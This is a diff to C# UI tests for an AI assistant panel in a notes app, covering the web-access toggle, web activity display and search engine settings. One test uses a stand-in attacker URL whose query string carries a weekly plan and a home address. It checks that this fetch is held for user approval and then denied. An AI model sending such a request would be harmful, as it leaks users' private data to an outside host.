@@ -44,7 +44,7 @@ public sealed class AssistantViewUiTests : IDisposable
     }
 
     /// <summary>CLI mínimo: solo responde a la comprobación de versión, ayuda y sesión.</summary>
-    private string FakeCli(bool loggedIn, bool supportsEffort = true)
+    private string FakeCli(bool loggedIn, bool supportsEffort = true, bool supportsTools = false)
     {
         // El CLI vive fuera del almacenamiento privado: SettingsService restringe sus archivos a 0600.
         Directory.CreateDirectory(_cliDirectory);
@@ -53,7 +53,7 @@ public sealed class AssistantViewUiTests : IDisposable
             #!/bin/sh
             case "$1" in
               --version) echo "2.1.280 (Claude Code)";;
-              --help) echo "--output-format --include-partial-messages --resume --tools --safe-mode --model --system-prompt[-file] {{(supportsEffort ? "--effort" : "")}}";;
+              --help) echo "--output-format --include-partial-messages --resume --tools --safe-mode --model --system-prompt[-file] {{(supportsEffort ? "--effort" : "")}} {{(supportsTools ? "--mcp-config --strict-mcp-config --allowedTools --setting-sources --permission-mode" : "")}}";;
               auth) echo '{"loggedIn":{{(loggedIn ? "true" : "false")}},"authMethod":"claude.ai","email":"ana@example.com","subscriptionType":"pro"}';;
             esac
             """.Replace("\r\n", "\n", StringComparison.Ordinal) + "\n");
@@ -63,7 +63,7 @@ public sealed class AssistantViewUiTests : IDisposable
     }
 
     private (AssistantView View, AssistantViewModel Vm, Window Window, AiChatService Chats) Create(string cliPath,
-        Action<AiChatService, SettingsService>? seed = null)
+        Action<AiChatService, SettingsService>? seed = null, Func<SettingsService, VaultService, EnkiMcpServer>? vaultTools = null)
     {
         var settings = new SettingsService(_directory);
         settings.Settings.Ai.ClaudeCliPath = cliPath;
@@ -74,7 +74,8 @@ public sealed class AssistantViewUiTests : IDisposable
         var chats = new AiChatService(_directory);
         seed?.Invoke(chats, settings);
         var cli = new ClaudeCliService(settings, _directory);
-        var vm = new AssistantViewModel(cli, chats, settings, vault, new NotificationService(settings, _directory));
+        var vm = new AssistantViewModel(cli, chats, settings, vault, new NotificationService(settings, _directory),
+            vaultTools: vaultTools?.Invoke(settings, vault));
         var view = new AssistantView { DataContext = vm };
         var window = new Window { Content = view, Width = 1280, Height = 860, Background = new SolidColorBrush(Color.Parse("#121212")) };
         window.Show();
@@ -705,6 +706,118 @@ public sealed class AssistantViewUiTests : IDisposable
             Assert.True(reply.PendingApproval.Decision.IsCompletedSuccessfully);
         }
         finally { window.Close(); }
+    }
+
+    [Fact]
+    public void WebAccess_GlobeToggle_WebActivity_AndUnknownAddressApproval()
+    {
+        if (OperatingSystem.IsWindows()) return;
+        EnkiMcpServer? server = null;
+        var (view, vm, window, _) = Create(FakeCli(loggedIn: true, supportsTools: true), (chats, settings) =>
+        {
+            var chat = new AiChatSession { Title = "Tiempo", VaultId = VaultId, WebAccess = true };
+            chat.Messages.Add(new AiChatMessage { Role = AiChatRole.User, Text = "¿Qué tiempo hará mañana en Sevilla?" });
+            chat.Messages.Add(new AiChatMessage
+            {
+                Role = AiChatRole.Assistant, Text = "Mañana, **24 °C** y despejado según [AEMET](https://www.aemet.es/).", Activities =
+                [
+                    new AiToolActivity { Tool = "web_search", Target = "tiempo Sevilla mañana", TargetKind = AiToolTargetKind.WebSearch, State = AiToolActivityState.Succeeded },
+                    new AiToolActivity { Tool = "web_fetch", Target = "Predicción para Sevilla", TargetKind = AiToolTargetKind.WebPage,
+                        TargetId = "https://www.aemet.es/es/eltiempo/prediccion/municipios/sevilla-id41091", State = AiToolActivityState.Succeeded }
+                ]
+            });
+            chats.Save(chat);
+            settings.Settings.Ai.LastChatByVault[VaultId] = chat.Id;
+        }, (settings, vault) => server = new EnkiMcpServer(new AiVaultToolbox(vault, new SessionService(vault), new KanbanService(_directory),
+            new PolarTaskService(_directory), new PolarAuthService(settings, baseUrl: "https://test.example", anonKey: "test"),
+            new ReminderService(_directory), settings)));
+        try
+        {
+            Assert.True(vm.VaultToolsAvailable);
+            var globe = Find<Button>(view, "WebAccessToggle");
+            Assert.True(globe.IsEffectivelyVisible);
+            Assert.Contains("on", globe.Classes);
+
+            var reply = vm.Messages.Last();
+            reply.IsActivitiesExpanded = true;
+            reply.PendingApproval = new AiApprovalViewModel(new AiApprovalRequest("web_fetch",
+                enki.Localization.LocalizedTextFormatter.Format("Assistant_Web_ApproveFetch"),
+                ["https://attacker.example/collect?notes=plan-semanal-y-direccion-completa-de-la-casa"],
+                enki.Localization.LocalizedTextFormatter.Format("Assistant_Web_ApproveFetch_Hint")));
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            var text = RenderedText(view);
+            Assert.Contains("https://attacker.example/collect?notes=plan-semanal-y-direccion-completa-de-la-casa", text);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Assistant_Web_ApproveFetch_Hint"], text);
+            Assert.Contains("Predicción para Sevilla", text);
+            Assert.True(reply.Activities.Single(a => a.Model.Tool == "web_fetch").CanOpen);
+            Assert.False(reply.Activities.Single(a => a.Model.Tool == "web_search").CanOpen);
+            SavePreview(view, "assistant-web-activity-approval");
+
+            globe.Command!.Execute(null);
+            Dispatcher.UIThread.RunJobs();
+            Assert.DoesNotContain("on", globe.Classes);
+            Assert.False(vm.WebAccessEnabled);
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            SavePreview(view, "assistant-web-off");
+            reply.PendingApproval.DenyCommand.Execute(null);
+        }
+        finally
+        {
+            window.Close();
+            server?.Dispose();
+        }
+    }
+
+    [Fact]
+    public void Settings_InternetAccess_ShowsEngineChoiceAndBraveKeyField()
+    {
+        var settings = new SettingsService(_directory);
+        settings.Settings.Ai.ConsentAcceptedUtc = DateTime.UtcNow;
+        settings.Settings.Ai.Enabled = true;
+        var vault = new VaultService(settings);
+        vault.InitializeVault(Path.Combine(_directory, "vault"), seedWelcomeNote: false);
+        var auth = new PolarAuthService(settings);
+        var sync = new PolarSyncService(auth, new SupabaseRestClient(auth), new PolarTaskService(_directory),
+            new ReminderService(_directory), settings);
+        var cli = new ClaudeCliService(settings, _directory);
+        using var web = new AiWebService(settings, new AiApiKeyStore(new MemoryCredentialStore(), AiApiKeyKind.BraveSearch));
+        var vm = new SettingsViewModel(settings, new CustomThemeService(settings), new BrandLogoService(_directory),
+            new VaultSettingsService(vault), vault, new VaultBackupService(vault, _directory), auth, sync,
+            new NotificationService(settings, _directory),
+            (_, _) => Task.FromResult(false), _ => { }, _ => { }, _ => { }, _ => { }, (_, _) => { }, () => { }, () => { },
+            _ => { }, _ => { }, _ => { }, _ => { }, () => { },
+            aiCliStatus: new ClaudeCliStatusViewModel(cli), aiChatService: new AiChatService(_directory), aiWebService: web);
+        var view = new SettingsView { DataContext = vm };
+        var window = new Window { Content = view, Width = 1280, Height = 1100, Background = new SolidColorBrush(Color.Parse("#121212")) };
+        window.Show();
+        try
+        {
+            vm.SelectSectionCommand.Execute(SettingsSection.Ai);
+            vm.SearchText = enki.Localization.LocalizationService.Instance["Settings_Ai_Web_NewChats_Label"];
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            var text = RenderedText(view);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_DuckDuckGoHelp"], text);
+            Assert.DoesNotContain(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_BraveHelp"], text);
+            SavePreview(view, "settings-ai-web-duckduckgo", 1280, 1100);
+
+            vm.UseBraveSearchCommand.Execute(null);
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            text = RenderedText(view);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_BraveHelp"], text);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_BraveKey_None"], text);
+            var engines = view.GetVisualDescendants().OfType<RadioButton>().Where(r => r.GroupName == "AiWebEngine").ToList();
+            Assert.Equal([false, true], engines.Select(r => r.IsChecked == true));
+            SavePreview(view, "settings-ai-web-brave", 1280, 1100);
+        }
+        finally
+        {
+            window.Close();
+        }
     }
 
     [Fact]
